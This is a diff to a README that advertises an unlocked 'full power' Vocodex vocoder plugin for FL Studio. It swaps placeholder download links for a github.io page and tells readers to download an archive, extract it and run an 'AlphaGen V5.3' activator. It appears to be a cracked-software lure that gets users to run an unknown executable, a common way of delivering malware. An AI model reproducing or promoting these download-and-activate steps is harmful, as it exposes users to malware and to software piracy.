@@ -2,13 +2,13 @@
 
 Unlock the full power of Vocodex in FL Studio. Create rich vocoder effects, robotic vocals, and advanced spectral shaping for unique sound design.
 
-[![Download](https://img.shields.io/badge/Download-Vocodex-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Vocodex-blueviolet)](https://vocodex-fl-studio.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://vocodex-fl-studio.github.io/.github)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure plugin settings  
 4. ✅ Launch FL Studio and start using Vocodex with full functionality
